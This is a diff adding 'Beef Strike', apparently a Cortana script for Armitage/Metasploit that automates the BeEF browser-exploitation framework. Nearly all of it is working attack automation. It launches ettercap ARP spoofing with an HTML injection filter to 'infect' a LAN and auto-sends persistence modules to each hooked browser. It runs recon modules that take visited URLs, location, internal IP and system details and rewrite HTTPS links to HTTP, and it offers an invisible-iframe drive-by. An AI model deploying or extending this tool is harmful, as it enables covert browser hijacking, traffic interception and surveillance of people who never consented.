@@ -1,0 +1,232 @@
+# Beef interaction by benyG
+# Tested on backtrack5r3
+# video demo: http://www.youtube.com/watch?v=YhKhkYzq2s8&feature=share&list=UU7_xeQ_4d8jAMtxdJgikjlA
+
+# At this time, This script doesn't use the beef_online command of beef metasploit plugin
+# to update zombies list. At result, but it try to reproduce it. 
+# So if you try to add host while this script is running, you will falsify final result. 
+# Do your recruitment and Let Beef_strike add host for you. 
+#  
+# work in progress...
+
+on ready {
+$console = console();
+$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
+cmd($console , "load beef");
+}
+
+on console_load {show_message("$3");
+		append($console, "\c5 /!\\ You may need to connect to BeEF Server");}
+# on console_beef_connect {show_message("$3");}
+
+$first = 0 ;        # first beef's zombie id
+@beef_hosts = @(%());  # array of beef's zombies
+
+popup attacks {
+	menu "BeEF Strike"{
+
+#	iten "e" {cmd($console, "beef_online");
+#		@beef_zb = @(%());
+#		@beef_zb = parse_table("",);
+#		}
+
+		item "Connect" {
+		# Default value of Auto-import & Client-side auto-recon.
+		$import = 1;
+		$recon = 1;
+		cmd($console , "beef_disconnect");
+		$url = prompt_text("beef server URL","http://127.0.0.1:4000");
+		$user = prompt_text("User","beef");
+		$pass = prompt_text("Password","beef");
+		cmd($console , "beef_connect $url $user $pass");
+		}
+
+		menu "Recruitment" {
+#use ettercap filter for html injection - low injection success rate.
+			item "ettercap method" {
+			$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
+			$filter = prompt_text("Put the absolute path of your filter","/opt/metasploit/msf3/data/armitage/cortana-scripts/beef_strike/infect.filter");
+			cmd_async(" xterm -e 'etterfilter $filter -o html.ef'");
+    			cmd_async(" xterm -e 'ettercap -T -q -i $eth0 -F html.ef -M ARP // //'");
+			show_message("ettercap filter > Contamination beging ...");
+				}
+			item "mitmproxy method"{
+	# this feature will use iframe_injector script from mitmproxy to increase injection success rate.
+			show_message("Feature in dev.");
+				}
+	#  [recruitment method idea]
+	# xsser method for find xss vulns and auto add beef hooks.
+	# spear phishing campaign.
+		}
+
+		item "Zombies" {
+		local('$zombitable');
+		$zombitable = open_table_tab("zombies", "", @("id", "address"), @(), @("Refresh"), "zmb_hook", 1);
+		refresh_hosts($zombitable);
+		}
+
+		menu "Auto import" {
+# import new zombies automatically in the metasploit database.
+			item "ON" {   
+		 append($console, "\c9 [*] Auto import enable");	                      			        $import = 1 ;
+		        	}
+			item "OFF" {  
+	 	 append($console, "\c4 [*]  Auto import disable");	                       			        $import = 0 ;
+		        	}
+		}
+
+			menu "Client-side auto recon." {
+# Automatically drive client-side reconnaissance once a new zombie appear.
+			item "ON" { 
+                  append($console, "\c9 [*] Client-side auto recon. enable");	
+		        $recon = 1 ;
+		        	}
+			item "OFF" {  
+		  append($console, "\c4 [*] Client-side auto recon. disable");                 			        $recon = 0 ;
+		        	}
+		}
+	
+		item "BeEF-Console" {
+		$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
+		cmd($console , "load beef");
+		cmd($console , "beef_connect $url $user $pass");
+		}
+
+		item "web UI panel" {
+		$urlpanel = "/ui/panel";
+		url_open("$url $+ $urlpanel");
+		}
+
+		item "Disconnect" {
+		cmd($console , "beef_disconnect");
+		cmd($console , "load beef");
+		}
+	}
+}
+
+#when zombie is offline icon must turn red.
+#filter host_image {
+#		$address = $2['address'];
+#		push($1, script_resource("zombie.png")); 
+#		return @_;
+#		}
+
+on heartbeat_15s {
+	if ( $import == 1 ) { 
+	cmd($console , "beef_import");
+#	cmd($console , "beef online");
+		} 
+	}
+
+popup zmb_hook {
+		menu "BeEF action" {
+		item "Information" { 
+		@idr = flatten(table_selected($1, "id"));		
+		$idr = @idr[0]; 
+		@adr = flatten(table_selected($1, "address"));		
+		$adr = @adr[0]; 
+	append($console, "+----------------------------------------------+");
+	append($console, "+--- \c7 zombie N° $idr --> $adr ---+");
+	append($console, "+----------------------------------------------+");
+                    
+		cmd($console , "beef_target -i $idr");
+	append($console, "+----------------------------------------------+");
+# result of this function appear on teamserver console
+		recon_result($idr);
+	append($console, "+----------------->  END  <--------------------+");
+			}
+		item "Recon." {
+		@idr = flatten(table_selected($1, "id"));		
+		$idr = @idr[0];                
+		driverecon($idr);
+			 }
+		item "Drive-by" { 
+# Execute beef_target -e $id 27 and send invisible iframe to victim browser-
+ 	$inviframe = prompt_text("URL","http://");
+	cmd($console , "beef_target -e $id 27"); # URL param not in use ...
+
+ 				}
+		}	
+	}
+
+sub refresh_hosts {
+	table_set($1, @beef_hosts);
+	}
+
+on tab_table_click {
+	if ($3 eq "Refresh") {
+		refresh_hosts($1);
+	}
+}
+
+on host_add {
+	# try to build result of beef_online command. 
+	%newhost = %(id => $first, address => "$1");
+	$id = %newhost["id"];
+	$ad = %newhost["address"];
+	show_message("new zombie > Id: $id -- IP: $ad");
+	add(@beef_hosts, %newhost, $first);
+	append($console, "\c9 Send MiTB module for Persistence ------->");	
+	cmd($console , "beef_target -e $id 32"); # MITB Persistence
+	cmd($console , "beef_target -e $id 30"); # POP-Under Persistence
+	# feel free to add another persistence module here. 
+
+# Drive or not drive auto recon that's the question .
+	if ( $recon == 1 ) { 
+	# BeEF recon modules deployment
+	driverecon($first);
+	} else {
+	append($console, "[*]\cB Client-side auto recon. have been disabled \n Drive or not drive auto recon ? that's the question");
+	}
+     $first = $first + 1 ; 
+}
+
+
+sub driverecon {
+	append($console, "[*]\cB Send client-side recon. modules ------------>");	
+	cmd($console , "beef_target -e $1 101"); # fingerprint browser
+	cmd($console , "beef_target -e $1 94"); # replace https hrefs by http
+	cmd($console , "beef_target -e $1 78"); # get visited domains
+	cmd($console , "beef_target -e $1 79"); # get visited URLs
+	cmd($console , "beef_target -e $1 107"); # get physical location
+	cmd($console , "beef_target -e $1 108"); # get location using location API
+	cmd($console , "beef_target -e $1 115"); # get internal IP (behind NAT)
+	cmd($console , "beef_target -e $1 110"); # get system information
+	cmd($console , "beef_target -e $1 113"); # detect installed software (IE only)
+	append($console, "\cB (!) BeEF say \"Command not send\", don't pay attention.");
+# feel free to add another module here to build complete user and system profile ;-)
+}
+
+sub recon_result {
+	append($console, "[*]\c1 Recon. result ------------>");	
+	append($console, ">\c8 fingerprint browser ");	
+	cmd($console , "beef_target -r $1 101"); # fingerprint browser
+	append($console, ">\c8 replace https hrefs by http ");	
+	cmd($console , "beef_target -r $1 94"); # replace https hrefs by http
+	append($console, ">\c8  get visited domains");	
+	cmd($console , "beef_target -r $1 78"); # get visited domains
+	append($console, ">\c8 get visited URLs");	
+	cmd($console , "beef_target -r $1 79"); # get visited URLs
+	append($console, ">\c8 get physical location");	
+	cmd($console , "beef_target -r $1 107"); # get physical location
+	append($console, ">\c8 get location using location API ");	
+	cmd($console , "beef_target -r $1 108"); # get location using location API
+	append($console, ">\c8 get internal IP (behind NAT) ");	
+	cmd($console , "beef_target -r $1 115"); # get internal IP (behind NAT)
+	append($console, ">\c8 get system information");	
+	cmd($console , "beef_target -r $1 110"); # get system information
+	append($console, ">\c8 detect installed software (IE only)");	
+	cmd($console , "beef_target -r $1 113"); # detect installed software (IE only)
+	append($console, "\c8 :-)");
+}
+
+# on console_beef_online{
+# 	@online = parse_table($3, @("Id", "IP", "OS"));
+#  	println(@online);
+# 	append($console, "@online");
+# 	foreach $nReports (@online) {
+# 		($Id, $IP, $OS) = values($online, @('Id', 'IP', 'OS'));
+# 		show_message($Id);
+# 		}
+# }
+
